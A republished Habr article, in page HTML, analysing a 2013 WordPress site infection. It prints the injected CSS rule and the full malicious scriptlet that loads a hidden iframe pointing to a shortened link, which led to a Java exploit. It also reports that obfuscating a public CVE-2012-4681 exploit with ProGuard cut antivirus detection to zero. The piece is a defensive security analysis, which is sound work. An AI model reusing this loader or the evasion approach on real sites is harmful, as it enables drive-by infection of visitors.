<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Infection on the site - history by example</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Injection of malicious code in WordPress (Image Source ) 

 This story begins between 03/28/2013 and 04/04/2013. During this time, the site ******. Ru...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Infection on the site - history by example</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/8de/e00/7d8/8dee007d8e53df473999f318d56cc8e1.gif" alt="image"><br><h6>  Injection of malicious code in WordPress (Image <a href="http://girmacea.com/blog/issues-fix/wordpress-virus-and-how-to-remove-it">Source</a> ) </h6><br><br>  This story begins between 03/28/2013 and 04/04/2013.  During this time, the site ******. Ru was infected.  This is well tracked by archive.org.  The following line appears in the page code. <br><a name="habracut"></a><br><br><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">link</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rel</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"stylesheet"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/css"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">media</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"all"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://******.ru/wp-content/style.css"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      If at that time to open this css, then there begins the path to the other side of the Internet. <br><br><pre> <code class="html hljs xml">body { behavior:url(http://******.ru/wp-content/wp-content/themes.sct); }</code> </pre><br><br>  Here is the almost unmodified themes.sct file. <br><br><pre> <code class="html hljs xml">/* * Sizzle CSS Selector Engine - v0.9.3 * Copyright 2009, The Dojo Foundation * Released under the MIT, BSD, and GPL Licenses. * More information: http://sizzlejs.com/ */ /* This file create by Cms. Don't delete it! */ <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">sriptlet</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">implements</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">behavior</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">implements</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">sript</span></span></span><span class="hljs-tag">&gt;</span></span>xchk='_';xurl='\x08//goo.gl/1JvYY';(xifr=document.createElement('iframe')).style.display='none';doument.body.appendChild(xifr);with(xifr){id='xfid';addBehavior('#default#userData');load(xchk);if(!getAttribute(xchk)){setAttribute(xchk,'_');save(xchk);expires=(new Date((new Date()).getTime()+6e8)).toUTCString();src=xurl;}}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">sript</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">scriptlet</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  Googling for this ‚Äúmiracle‚Äù, at least for me, gave nothing.  When copying the code to the * .htc file, the response was not observed.  It is possible that this is 0-day.  Performance tested on IE7-8.  The link goo.gl/1JvYY leads on justhaveown.myvnc.com/prok.php.  By mid-May, the link was already dead.  But the attacker had at least 45 days and an audience of 9,000 unique visitors per day to fulfill his plans.  In addition, there is a possibility of using a filter by provider, country, etc. <br><br>  Some information on the loadable module was found <a href="https://lists.emergingthreats.net/pipermail/emerging-sigs/2013-May/021953.html">here</a> , if not available, then the <a href="https://lists.emergingthreats.net/pipermail/emerging-sigs/2013-May/021953.html%2Bxchk%253D%27_%27%26cd%3D1%26hl%3Dru%26ct%3Dclnk%26gl%3Dru">cache</a> .  As a result, the BBfrtY.jar file was obtained, which Microsoft turned out to be Exploit: Java / CVE-2013-0422.  If you believe <a href="">securelist.com</a> , the beginning of the epidemic was still in mid-January.  At the same time, signs of a site being infected with a virus three months old were not registered by the site administration for at least one and a half months.  By signs, I understand the presence of a foreign file themes.sct in the site directory.  If you believe archive.org, then finally the traces of the virus were removed after the first days of August.  It is more difficult to say, as there are no snapshots in archive.org after this date. <br><br>  Unfortunately, this is a very typical story.  Even if large portals can <a href="http://www.securitylab.ru/news/433098.php">host a</a> virus for several hours or even days.  The author personally observed such viral activity at the beginning of summer, on the website of the news media, which has 300-400 thousand users per day and a portal of a large radio station with 100 thousand users.  Small sites may not even know that they had something. <br><br>  For testing, how real and repeatable this situation is now, CVE-2012-4681 and the code <a href="http://www.pvv.ntnu.no/~josteitv/all-your-jres-are-belong-to-us.com/CVE-2012-4681/">from here</a> was chosen.  ProGuard 4.10 and themes.sct file were also taken. <br><br>  Test results for virustotal: <br><ul><li>  <a href="https://www.virustotal.com/en/file/a0f2abd2d503b9fe7a4c5f36a27f0322bbb32ee6f225caf355af5d1cb9b62d93/analysis/1379190431/">themes.sct</a> - <a href="https://www.virustotal.com/en/file/a0f2abd2d503b9fe7a4c5f36a27f0322bbb32ee6f225caf355af5d1cb9b62d93/analysis/1379190431/">0/47</a> </li><li>  <a href="https://www.virustotal.com/en/file/df743d4b8653ecec72ca786854f7da473e7b0ff293aebe18461d4c7e90962180/analysis/1379190722/">CVE-2012-4681.jar</a> - <a href="https://www.virustotal.com/en/file/df743d4b8653ecec72ca786854f7da473e7b0ff293aebe18461d4c7e90962180/analysis/1379190722/">17/47</a> </li><li>  <a href="https://www.virustotal.com/en/file/6daa43da46675af0538c94eebf242d224765e952186e054136250f934054f21d/analysis/1379191042/">CVE-2012-4681.jar after obfuscation</a> - <a href="https://www.virustotal.com/en/file/6daa43da46675af0538c94eebf242d224765e952186e054136250f934054f21d/analysis/1379191042/">0/47</a> </li></ul><br>  That is, even now, six months after the publication of PoC, only 36% of antiviruses consider the current java exploit to be a threat.  And after obfuscation, this indicator drops to zero.  By the way, I have big doubts that some packer / protector will be able to achieve such results for PE files.  The consequences of decades of struggle make themselves felt. <br><br>  It turns out that, on the one hand, there is insufficient audit of the integrity of files, the database, or the reliability of passwords, and sometimes simply: ‚Äú <a href="http://habrahabr.ru/post/93631/">Thank you, we'll figure it out on Monday</a> .‚Äù  On the other hand, the lack of readiness of the ‚Äúshield‚Äù for new threats. <br>  All links and files used in the article can be provided by personal messages or if the community finds their publication relevant. <br><habracut></habracut></div><p>Source: <a href="https://habr.com/ru/post/193882/">https://habr.com/ru/post/193882/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../193872/index.html">Development plans for High Performance Computing School at Innopolis University became known.</a></li>
<li><a href="../193874/index.html">Scale a real-life project database using SQL Azure Federations. Part 2: Baseline</a></li>
<li><a href="../193876/index.html">CodeBender.cc - Arduino programming from a browser</a></li>
<li><a href="../193878/index.html">Where dreams lead</a></li>
<li><a href="../193880/index.html">A passion for programming. Chapter 4. Be the worst</a></li>
<li><a href="../193886/index.html">The birth of magic from the spirit of the torrent protocol (scheme of the organization of a free uncensored indestructible information network)</a></li>
<li><a href="../193888/index.html">Writing a platformer in Python using pygame</a></li>
<li><a href="../193890/index.html">Python memory usage</a></li>
<li><a href="../193892/index.html">A car dial tachometer for a beginner or some fixed-point shamanism on the AVR</a></li>
<li><a href="../193894/index.html">Review of modern heuristic optimization methods</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>